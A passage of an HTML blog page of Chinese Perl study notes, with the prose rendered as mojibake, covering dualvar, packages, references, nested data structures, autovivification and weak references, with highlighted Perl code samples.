title="åŒé‡å˜é‡"></a>åŒé‡å˜é‡</h3><p>å¯¹æ•°å€¼å’Œå­—ç¬¦ä¸²çš„ç¼“å­˜å…è®¸ä½ ä½¿ç”¨ä¸€ä¸ªç§°ä¸º <mark>åŒé‡å˜é‡</mark> çš„ç‰¹æ€§. å³åŒæ—¶æ‹¥æœ‰æ•°å€¼å’Œå­—ç¬¦ä¸²è¡¨ç¤ºçš„å€¼, éœ€è¦ä½¿ç”¨æ ¸å¿ƒæ¨¡å— <code>Scalar::Util</code> æä¾›çš„ <code>dualvar()</code> å‡½æ•°, å…¶å…è®¸ä½ åˆ›å»ºä¸€ä¸ªæ‹¥æœ‰ä¸¤ä¸ªä¸åŒå½¢å¼çš„å€¼:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Scalar::Util <span class="hljs-string">&#x27;dualvar&#x27;</span>;<br><span class="hljs-keyword">my</span> $false_name = dualvar <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;Sparkles &amp; Blue&#x27;</span>;<br><span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Boolean true!&#x27;</span> <span class="hljs-keyword">if</span> !! $false_name;<br><span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Numeric false!&#x27;</span> <span class="hljs-keyword">unless</span> <span class="hljs-number">0</span> + $false_name;<br><span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;String true!&#x27;</span> <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&#x27;</span> . $false_name;<br></code></pre></td></tr></table></figure><h2 id="åŒ…"><a href="#åŒ…" class="headerlink" title="åŒ…"></a>åŒ…</h2><p>Perl ä¸­çš„ <mark>åç§°ç©ºé—´</mark> æ˜¯ä¸€ç§æœºåˆ¶, å®ƒå°†è‹¥å¹²å…·åå®ä½“, å…³è”å¹¶å°è£…äº, æŸå…·ååˆ†ç±»ä¹‹ä¸‹.</p><p>Perl ä¸­çš„åŒ…æ˜¯å•ä¸€åç§°ç©ºé—´ä¸‹ä»£ç çš„é›†åˆ, åœ¨æŸç§æ„ä¹‰ä¸Š, åŒ…å’Œåç§°ç©ºé—´æ˜¯ç­‰ä»·çš„.</p><p>é»˜è®¤åŒ…æ˜¯ <code>main</code> åŒ….</p><p>é™¤åŒ…åå¤–, ä¸€ä¸ªåŒ…è¿˜æ‹¥æœ‰ä¸€ä¸ªç‰ˆæœ¬ä»¥åŠä¸‰ä¸ªéšå«çš„æ–¹æ³•, åˆ†åˆ«æ˜¯ <code>VERSION()</code>, <code>import()</code> å’Œ <code>unimport()</code>. <code>VERSION()</code> è¿”å›ä¸€ä¸ªåŒ…çš„ç‰ˆæœ¬.</p><p><mark>åŒ…ç‰ˆæœ¬</mark> æ˜¯åŒ…å«åœ¨åä¸º <code>$VERSION</code> çš„åŒ…å…¨å±€å˜é‡ä¸­çš„ä¸€ç³»åˆ—æ•°å­—. æŒ‰ç…§æƒ¯ä¾‹, ç‰ˆæœ¬å·å€¾å‘äºå†™æˆä¸€ç³»åˆ—ç”±ç‚¹åˆ†éš”æ•´æ•°çš„å½¢å¼, å¦‚ <code>1.23</code>, <code>1.1.10</code>.</p><p>Perl 5.10 ä»¥åŠæ—©æœŸ:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> MyCode;<br><span class="hljs-keyword">our</span> $VERSION = <span class="hljs-number">1.21</span>;<br></code></pre></td></tr></table></figure><p>Perl 5.12 å¼•å…¥çš„ç®€åŒ–å†™æ³•:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> MyCode <span class="hljs-number">1.2</span>.<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>æ¯ä¸ªåŒ…éƒ½æœ‰ <code>VERSION</code> æ–¹æ³•, ä»–ä»¬ç»§æ‰¿è‡ª <code>UNIVERSAL</code> åŸºç±», å…¶è¿”å› <code>$VERSION</code> ä¸­çš„å€¼:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">say</span> main-&gt;VERSION;<br></code></pre></td></tr></table></figure><h3 id="åŒ…å’Œåç§°ç©ºé—´"><a href="#åŒ…å’Œåç§°ç©ºé—´" class="headerlink" title="åŒ…å’Œåç§°ç©ºé—´"></a>åŒ…å’Œåç§°ç©ºé—´</h3><p>æ¯ä¸€å¥ <code>package</code> å£°æ˜éƒ½ä¼šä½¿ Perl å®Œæˆä¸¤ä»¶ä»»åŠ¡:</p><ul><li>å¦‚æœåç§°ç©ºé—´ä¸å­˜åœ¨åˆ™åˆ›å»ºå®ƒ</li><li>å‘Šè¯‰è¯­æ³•åˆ†æå™¨å°†åç»­çš„åŒ…å…¨å±€ç¬¦å·æ”¾å…¥è¯¥åç§°ç©ºé—´ä¸‹</li></ul><p>é€šè¿‡ä½¿ç”¨åŒ…å£°æ˜è¯­å¥, å¯ä»¥åœ¨ä»»ä½•æ—¶å€™å‘ä¸€ä¸ªåç§°ç©ºé—´æ·»åŠ å‡½æ•°å’Œå˜é‡:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Pack;<br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">first_sub</span> </span>&#123; ... &#125;<br><br><span class="hljs-keyword">package</span> main;<br>Pack::first_sub();<br><br><span class="hljs-keyword">package</span> Pack;<br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">second_sub</span> </span>&#123; ... &#125;<br><br><span class="hljs-keyword">package</span> main;<br>Pack::second_sub();<br></code></pre></td></tr></table></figure><p>æˆ–è€…ç”¨å®Œå…¨é™å®šçš„åç§°æ¥æ·»åŠ , å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">Pack</span>::<span class="hljs-title">third_sub</span> </span>&#123; ... &#125;<br></code></pre></td></tr></table></figure><p>åç§°ç©ºé—´å¯ä»¥æŒ‰ç»„ç»‡éœ€è¦åˆ†ä¸ºå¤šä¸ªçº§åˆ«, ä½†è¿™å¹¶ä¸æ„å‘³ç€ç»§æ‰¿å…³ç³».</p><p>å¸¸è§çš„åšæ³•æ˜¯ä¸ºä¸šåŠ¡æˆ–é¡¹ç›®åˆ›å»ºä¸€ä¸ªé¡¶å±‚åç§°ç©ºé—´, å¦‚:</p><ul><li><code>StrangeMonkey</code> æ˜¯é¡¹ç›®åç§°;</li><li><code>StrangeMonkey::UI</code> åŒ…å«é¡¶å±‚ç”¨æˆ·æ¥å£çš„ä»£ç ;</li><li><code>StrangeMonkey::Persistence</code> åŒ…å«é¡¶å±‚æ•°æ®ç®¡ç†ä»£ç ;</li><li><code>StrangeMonkey::Test</code> åŒ…å«ä¸ºé¡¹ç›®ç¼–å†™çš„é¡¶å±‚æµ‹è¯•ä»£ç ;</li></ul><h2 id="å¼•ç”¨"><a href="#å¼•ç”¨" class="headerlink" title="å¼•ç”¨"></a>å¼•ç”¨</h2><p>Perl 5 æä¾›äº†ä¸€ç§æœºåˆ¶, é€šè¿‡å®ƒä½ å¯ä»¥ç®€ä»‹ä½¿ç”¨æŸå€¼è€Œä¸å¿…ä¸ºæ­¤åˆ›å»ºä¸€ä»½æ‹·è´.</p><p>å¼•ç”¨æ˜¯ Perl 5 ä¸­çš„ä¸€ç­‰å…±æ°‘, æ˜¯ä¸€ç§ <mark>å†…ç½®çš„æ ‡é‡æ•°æ®ç±»å‹</mark> , å®ƒä¸æ˜¯å­—ç¬¦ä¸², ä¸æ˜¯æ•°ç»„, ä¹Ÿä¸æ˜¯å“ˆå¸Œ. å®ƒå°±æ˜¯ä¸€ä¸ªå¼•ç”¨å…¶ä»–ç¬¬ä¸€ç­‰æ•°æ®ç±»å‹çš„æ ‡é‡.</p><h3 id="æ ‡é‡å¼•ç”¨"><a href="#æ ‡é‡å¼•ç”¨" class="headerlink" title="æ ‡é‡å¼•ç”¨"></a>æ ‡é‡å¼•ç”¨</h3><p>è§£å¼•ç”¨éœ€è¦åœ¨è§£å¼€æ¯ä¸€é‡å¼•ç”¨æ—¶åŠ ä¸Šé¢å¤–çš„å°è®°.</p><p>å¤æ‚çš„å¼•ç”¨éœ€è¦åŠ ä¸Šä¸€å¯¹å¤§æ‹¬å·ä»¥æ¶ˆé™¤è¡¨è¾¾å¼æ–­å¥ä¸Šçš„æ­§ä¹‰:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">reverse_in_place</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $name_ref = <span class="hljs-keyword">shift</span>;<br>    $&#123; $name_ref &#125; = <span class="hljs-keyword">reverse</span> $&#123; $name_ref &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><p>Perl ä¸æä¾›å†…å­˜ä½ç½®çš„åŸç”Ÿè®¿é—®.</p><p>è¿™äº›åœ°å€ä»…åœ¨å¤§è‡´ä¸Šå”¯ä¸€, å› ä¸ºåœ¨åƒåœ¾å›æ”¶å™¨å›æ”¶æŸæœªå¼•ç”¨çš„å¼•ç”¨å, Perl å¯èƒ½é‡ç”¨æ­¤å­˜å‚¨ä½ç½®.</p><h3 id="æ•°ç»„å¼•ç”¨"><a href="#æ•°ç»„å¼•ç”¨" class="headerlink" title="æ•°ç»„å¼•ç”¨"></a>æ•°ç»„å¼•ç”¨</h3><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @cards      = <span class="hljs-string">qw( K Q J 10 9 8 7 6 5 4 3 2 A )</span>;<br><span class="hljs-keyword">my</span> $cards_ref  = \@cards;<br><br><span class="hljs-keyword">my</span> $card_count = @$cards_ref;<br><span class="hljs-keyword">my</span> @card_copy  = @$cards_ref<br></code></pre></td></tr></table></figure><p>æ•°ç»„åˆ†ç‰‡:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @high_card = @&#123; $cards_ref &#125;[<span class="hljs-number">1</span> .. <span class="hljs-number">2</span>, -<span class="hljs-number">1</span>];<br></code></pre></td></tr></table></figure><h3 id="å‡½æ•°å¼•ç”¨"><a href="#å‡½æ•°å¼•ç”¨" class="headerlink" title="å‡½æ•°å¼•ç”¨"></a>å‡½æ•°å¼•ç”¨</h3><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">bake_cake</span> </span>&#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Baking a wonderful cake!&#x27;</span> &#125;;<br><span class="hljs-keyword">my</span> $cake_ref = \&amp;bake_cake;<br><br>$cake_ref-&gt;();<br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œéœ€è¦ç”¨<mark>è§£å¼•ç”¨ç®­å¤´</mark>è°ƒç”¨å¼•ç”¨æŒ‡å‘çš„å‡½æ•°.k</p><p>åˆ›å»ºåŒ¿åå‡½æ•°, è¿™é‡Œä½¿ç”¨ <code>sub</code> å…³é”®å­—ä¸ç”¨å‡½æ•°åç§°ä¹Ÿå¯ä»¥ä½¿å¾—å‡½æ•°æ­£å¸¸ç¼–è¯‘, ä½†æ˜¯å®ƒä¸ä¼šè¢«å®‰è£…åˆ°å½“å‰çš„åç§°ç©ºé—´ä¸­, è®¿é—®æ­¤å‡½æ•°çš„å”¯ä¸€æ–¹æ³•å°±æ˜¯é€šè¿‡å¼•ç”¨.</p><h3 id="æ–‡ä»¶å¥æŸ„å¼•ç”¨"><a href="#æ–‡ä»¶å¥æŸ„å¼•ç”¨" class="headerlink" title="æ–‡ä»¶å¥æŸ„å¼•ç”¨"></a>æ–‡ä»¶å¥æŸ„å¼•ç”¨</h3><p>å½“ä½¿ç”¨ <code>open</code> (<code>opendir</code>) è¯æ³•æ–‡ä»¶å¥æŸ„å½¢å¼, å…¶å®å°±åœ¨å¤„ç†æ–‡ä»¶å¥æŸ„å¼•ç”¨, å¯¹æ­¤æ–‡ä»¶å¥æŸ„è¿›è¡Œå­—ç¬¦ä¸²åŒ–å¯ä»¥å¾—åˆ°ç±»ä¼¼ <code>GLOB(0x8bda880)</code> å½¢å¼çš„ä¸œè¥¿.</p><p>å†…éƒ¨æœºåˆ¶ä¸Š, è¿™äº›æ–‡ä»¶å¥æŸ„éƒ½æ˜¯ <code>IO::Handle</code> ç±»çš„å¯¹è±¡, å½“ä½ åŠ è½½è¿™ä¸ªæ¨¡å—, å¯ä»¥è°ƒç”¨æ–‡ä»¶å¥æŸ„ä¸Šçš„æ–¹æ³•:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> IO::Handle;<br><span class="hljs-keyword">use</span> autodie;<br><br><span class="hljs-keyword">open</span> <span class="hljs-keyword">my</span> $out_fh, <span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-string">&#x27;output_file.txt&#x27;</span>;<br>$out_fh-&gt;<span class="hljs-keyword">say</span>( <span class="hljs-string">&#x27;Have some text!&#x27;</span> );<br></code></pre></td></tr></table></figure><p>è€æ—§çš„ä»£ç ç”¨å‹å›¢ (typeglob) æ¥è·å–æ–‡ä»¶å¥æŸ„çš„å¼•ç”¨:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $fh = <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-keyword">local</span> *FH;<br>    <span class="hljs-keyword">open</span> FH, <span class="hljs-string">&quot;&gt; $file&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Can&#x27;t write to &#x27;$file&#x27;: $!\n&quot;</span>;<br>    \*FH;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å¼•ç”¨è®¡æ•°"><a href="#å¼•ç”¨è®¡æ•°" class="headerlink" title="å¼•ç”¨è®¡æ•°"></a>å¼•ç”¨è®¡æ•°</h3><p>Perl 5 ä½¿ç”¨ä¸€ç§åä¸º <mark>å¼•ç”¨è®¡æ•°</mark> çš„å†…å­˜ç®¡ç†æŠ€æœ¯ã€‚ç¨‹åºä¸­çš„æ¯ä¸€ä¸ªå€¼éƒ½æœ‰é™„åŠ çš„è®¡æ•°å™¨ã€‚ æ¯æ¬¡è¢«å…¶ä»–ä¸œè¥¿å¼•ç”¨æ—¶,Perl å¢åŠ è®¡æ•°å™¨çš„å€¼,æ— è®ºéšå¼è¿˜æ˜¯æ˜¾å¼ã€‚æ¯æ¬¡å¼•ç”¨æ¶ˆå¤±å,Perl å°†å‡å°‘è®¡æ•°å™¨çš„å€¼ã€‚å½“è®¡æ•°å™¨å‡è‡³é›¶,Perl å°±å¯ä»¥å®‰å…¨åœ°å›æ”¶è¿™ä¸ªå€¼ã€‚</p><p>å¯¹ <code>$fh</code> çš„å›æ”¶éšå¼åœ°è°ƒç”¨äº†è¯¥æ–‡ä»¶å¥æŸ„ä¸Šçš„ <code>close()</code> æ–¹æ³•, ä½¿å¾—æ–‡ä»¶æœ€ç»ˆè¢«å…³é—­.</p><h3 id="å¼•ç”¨å’Œå‡½æ•°"><a href="#å¼•ç”¨å’Œå‡½æ•°" class="headerlink" title="å¼•ç”¨å’Œå‡½æ•°"></a>å¼•ç”¨å’Œå‡½æ•°</h3><p>å¦‚æœéœ€è¦å¯¹å¼•ç”¨çš„å†…å®¹åšå‡ºç ´åæ€§æ”¹åŠ¨, è¯·å°†å…¶æ‰€å«çš„å€¼å¤åˆ¶åˆ°ä¸€ä¸ªæ–°çš„å˜é‡ä¸­:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @new_array = @&#123; $array_ref &#125;;<br><span class="hljs-keyword">my</span> %new_hash  = %&#123; $hash_ref &#125;;<br></code></pre></td></tr></table></figure><p>å¦‚æœå¼•ç”¨æ›´åŠ å¤æ‚, è€ƒè™‘ <code>Storable</code> æ¨¡å—å’Œå…¶ <code>dclose</code> (deep cloning) å‡½æ•°.</p><h2 id="åµŒå¥—æ•°æ®ç»“æ„"><a href="#åµŒå¥—æ•°æ®ç»“æ„" class="headerlink" title="åµŒå¥—æ•°æ®ç»“æ„"></a>åµŒå¥—æ•°æ®ç»“æ„</h2><p>Perl ä¸­çš„åµŒå¥—æ•°æ®ç»“æ„, ä¾‹å¦‚æ•°ç»„çš„æ•°ç»„, å“ˆå¸Œçš„å“ˆå¸Œ, æ˜¯é€šè¿‡å¼•ç”¨æœºåˆ¶æ¥å®ç°çš„.</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @famous_triplets = (<br>    [<span class="hljs-string">qw( eenie miney moe)</span>],<br>    [<span class="hljs-string">qw( huey dewey louie)</span>],<br>    [<span class="hljs-string">qw( duck duck goose)</span>],<br>)<br><br><span class="hljs-keyword">my</span> %meals = (<br>    <span class="hljs-string">breakfast =&gt;</span> &#123; <span class="hljs-string">entree =&gt;</span> <span class="hljs-string">&#x27;eggs&#x27;</span>,   <span class="hljs-string">side =&gt;</span> <span class="hljs-string">&#x27;hash browns&#x27;</span> &#125;,<br>    <span class="hljs-string">lunch     =&gt;</span> &#123; <span class="hljs-string">entree =&gt;</span> <span class="hljs-string">&#x27;panini&#x27;</span>, <span class="hljs-string">side =&gt;</span> <span class="hljs-string">&#x27;apple&#x27;</span> &#125;,<br>    <span class="hljs-string">breakfast =&gt;</span> &#123; <span class="hljs-string">entree =&gt;</span> <span class="hljs-string">&#x27;steak&#x27;</span>,  <span class="hljs-string">side =&gt;</span> <span class="hljs-string">&#x27;avocado salad&#x27;</span> &#125;,<br>)<br></code></pre></td></tr></table></figure><p>è§£å¼•ç”¨ä¹‹å‰çš„å˜é‡å€¼ä¸ºå¼•ç”¨:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $last_nephew = $famous_triplets[<span class="hljs-number">1</span>]-&gt;[<span class="hljs-number">2</span>];<br><span class="hljs-keyword">my</span> $breaky_side = $meals<span class="hljs-string">&#123;breakfast&#125;</span>-&gt;&#123;side&#125;;<br></code></pre></td></tr></table></figure><p>å› ä¸ºåµŒå¥—ä¸€ä¸ªæ•°æ®ç»“æ„çš„å”¯ä¸€æ–¹æ³•å°±æ˜¯é€šè¿‡å¼•ç”¨, å› æ­¤è¿™é‡Œçš„ç®­å¤´æ˜¯å¤šä½™çš„, å¦‚ä¸‹çš„ä»£ç å’Œå‰é¢ç­‰ä»·:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $last_nephew = $famous_triplets[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>];<br><span class="hljs-keyword">my</span> $breaky_side = $meals<span class="hljs-string">&#123;breakfast&#125;</span><span class="hljs-string">&#123;side&#125;</span>;<br></code></pre></td></tr></table></figure><p>è°ƒç”¨å­˜æ”¾äº<mark>åµŒå¥—æ•°æ®ç»“æ„å†…çš„å‡½æ•°å¼•ç”¨</mark>æ—¶, ä½¿ç”¨ç®­å¤´è°ƒç”¨è¯­æ³•æ˜¯æœ€æ¸…æ™°çš„, é™¤æ­¤ä¹‹å¤–å¯ä»¥é¿å¼€ç®­å¤´çš„ä½¿ç”¨.</p><p>æœ‰æ—¶, ä½¿ç”¨ä¸´æ—¶å˜é‡ä¼šæ›´æ¸…æ™°:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $breakfast_ref   = $meals<span class="hljs-string">&#123;breakfast&#125;</span>;<br><span class="hljs-keyword">my</span> ($entree, $side) = @$breakfast_ref&#123;<span class="hljs-string">qw( entree side )</span>&#125;;<br></code></pre></td></tr></table></figure><h3 id="è‡ªç”Ÿ"><a href="#è‡ªç”Ÿ" class="headerlink" title="è‡ªç”Ÿ"></a>è‡ªç”Ÿ</h3><p>å½“ä½ è¯•å›¾ç¼–å†™ä¸€ä¸ªåµŒå¥—æ•°æ®ç»“æ„ç»„ä»¶æ—¶, å¦‚æœä¸å­˜åœ¨, Perl ä¼šåˆ›å»ºé€šå‘è¿™éƒ¨åˆ†æ•°æ®ç»“æ„çš„è·¯å¾„:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @aoaoaoa;<br>$aoaoaoa[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>][<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;nested deeply&#x27;</span>;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªè¡Œä¸ºç§°ä¸º <mark>è‡ªç”Ÿ</mark> . å¥½å¤„æ˜¯å‡å°‘åµŒå¥—æ•°æ®ç»“æ„çš„åˆå§‹åŒ–ä»£ç .</p><p>CPAN ä¸Šçš„ <code>autovivification</code> ç¼–è¯‘æŒ‡ä»¤, è®©ä½ å¯ä»¥åœ¨è¯æ³•ä½œç”¨åŸŸå†…å¯¹æŸç‰¹å®šç±»å‹æ“ä½œç¦ç”¨è‡ªç”Ÿè¡Œä¸º.</p><h3 id="è°ƒè¯•åµŒå¥—æ•°æ®ç»“æ„"><a href="#è°ƒè¯•åµŒå¥—æ•°æ®ç»“æ„" class="headerlink" title="è°ƒè¯•åµŒå¥—æ•°æ®ç»“æ„"></a>è°ƒè¯•åµŒå¥—æ•°æ®ç»“æ„</h3><p>æ ¸å¿ƒæ¨¡å— <code>Data::Dumper</code> å¯ä»¥å°†ä»»æ„å¤æ‚çš„æ•°æ®ç»“æ„çš„å€¼å­—ç¬¦ä¸²åŒ–ä¸º Perl 5 ä»£ç :</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Data::Dumper;<br><br><span class="hljs-keyword">print</span> Dumper( $my_complex_structure );<br></code></pre></td></tr></table></figure><p>ä¸€äº›å¼€å‘äººå‘˜æ›´æ„¿æ„ä½¿ç”¨ <code>YAML::XS</code> å’Œ <code>JSON</code> æ¥è°ƒè¯•ç¨‹åº.</p><h3 id="å¾ªç¯å¼•ç”¨"><a href="#å¾ªç¯å¼•ç”¨" class="headerlink" title="å¾ªç¯å¼•ç”¨"></a>å¾ªç¯å¼•ç”¨</h3><p>ä¸¤ä¸ªäº’æŒ‡çš„å¼•ç”¨æœ€ç»ˆå½¢æˆäº†ä¸€å¾ªç¯å¼•ç”¨, Perl æ— æ³•è‡ªè¡Œé”€æ¯å®ƒ.</p><p>éœ€è¦æ‰‹åŠ¨æ‰“æ–­å¼•ç”¨è®¡æ•°, æˆ–è€…åˆ©ç”¨ä¸€ä¸ªåä¸º <mark>å¼±å¼•ç”¨</mark> çš„ç‰¹æ€§. å¼±å¼•ç”¨æ˜¯ä¸€ä¸ªä¸å¢åŠ è¢«å¼•ç”¨è€…å¼•ç”¨è®¡æ•°çš„å¼•ç”¨, å…¶å¯é€šè¿‡ <code>Scalar::Util</code> æ¥ä½¿ç”¨, å¯¼å‡º <code>weaken()</code> å‡½æ•°å¹¶å¯¹æŸå¼•ç”¨ä½¿ç”¨å®ƒå¯ä»¥é˜²æ­¢å¼•ç”¨è®¡æ•°çš„å¢åŠ :</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Scalar::Util <span class="hljs-string">&#x27;weaken&#x27;</span>;<br><span class="hljs-keyword">my</span> $alice = &#123; <span class="hljs-string">mother =&gt;</span> <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">father =&gt;</span> <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">children =&gt;</span> [] &#125;;<br><span class="hljs-keyword">my</span> $robert = &#123; <span class="hljs-string">mother =&gt;</span> <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">father =&gt;</span> <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">children =&gt;</span> [] &#125;;<br><span class="hljs-keyword">my</span> $cianne = &#123; <span class="hljs-string">mother =&gt;</span> $alice, <span class="hljs-string">father =&gt;</span> $robert, <span class="hljs-string">children =&gt;</span> [] &#125;;<br><br><span class="hljs-keyword">push</span> @&#123; $alice-&gt;&#123;children&#125; &#125;, $cianne;<br><span class="hljs-keyword">push</span> @&#123; $robert-&gt;&#123;children&#125; &#125;, $cianne;<br><br>weaken( $cianne-&gt;&#123;mother&#125; );<br>weaken( $cianne-&gt;&#123;father&#125; );<br></code></pre></td></tr></table></figure><h1 id="æ“ä½œç¬¦"><a href="#æ“ä½œç¬¦" class="headerlink" title="æ“ä½œç¬¦"></a>æ“ä½œç¬¦</h1><h2 id="æ“ä½œç¬¦ç‰¹å¾"><a href="#æ“ä½œç¬¦ç‰¹å¾" class="headerlink" title="æ“ä½œç¬¦ç‰¹å¾"></a>æ“ä½œç¬¦ç‰¹å¾</h2><p><code>perldoc perlop</code> å’Œ <code>perldoc perlsyn</code> æä¾›äº†å¤§é‡æœ‰å…³ Perl æ“ä½œç¬¦è¡Œä¸ºçš„ä¿¡æ¯.</p><p>æ¯ä¸€ä¸ªæ“ä½œç¬¦æŒæœ‰è‹¥å¹²æ„æˆå…¶è¡Œä¸ºçš„é‡è¦ç‰¹å¾:</p><ul><li>æ“ä½œæ•°çš„ä¸ªæ•°</li><li>å’Œå…¶ä»–æ“ä½œç¬¦çš„å…³ç³»</li><li>å¯èƒ½çš„ç”¨æ³•</li></ul><h3 id="ä¼˜å…ˆçº§"><a href="#ä¼˜å…ˆçº§" class="headerlink" title="ä¼˜å…ˆçº§"></a>ä¼˜å…ˆçº§</h3><p>å¯ä»¥ç”¨æ‹¬å·å°†å­è¡¨è¾¾å¼åˆ†ç»„ä½¿æŸæ“ä½œç¬¦åœ¨å…¶ä»–æ“ä½œç¬¦ä¹‹å‰æ±‚å€¼.</p><p><code>perldoc perlop</code> åŒ…å«äº†ä¸€å¼ ä¼˜å…ˆçº§è¡¨.</p><h3 id="ç»“åˆæ€§"><a href="#ç»“åˆæ€§" class="headerlink" title="ç»“åˆæ€§"></a>ç»“åˆæ€§</h3><p>æŸæ“ä½œç¬¦çš„ç»“åˆæ€§å†³å®šäº†å®ƒæ˜¯ä»å·¦å¾€å³æ±‚å€¼è¿˜æ˜¯ä»å³å¾€å·¦.</p><p>æ ¸å¿ƒæ¨¡å— <code>B::Deparse</code> å¯ä»¥é‡å†™ä»£ç ç‰‡æ®µå¹¶å¦‚å®å±•ç¤º Perl ç©¶ç«Ÿæ˜¯å¦‚ä½•å¤„ç†æ“ä½œç¬¦ä¼˜å…ˆçº§å’Œç»“åˆæ€§çš„. åœ¨æŸä»£ç æ®µä¸Šè¿è¡Œ <code>perl -MO=Deparse,-p</code> (<code>-p</code> æ ‡å¿—æ·»åŠ é¢å¤–çš„åˆ†ç»„æ‹¬å·ä½¿å¾—æ±‚å€¼é¡ºåºæ›´ä¸ºæ˜æ˜¾)</p><h3 id="å‚æ•°æ•°é‡"><a href="#å‚æ•°æ•°é‡" class="headerlink" 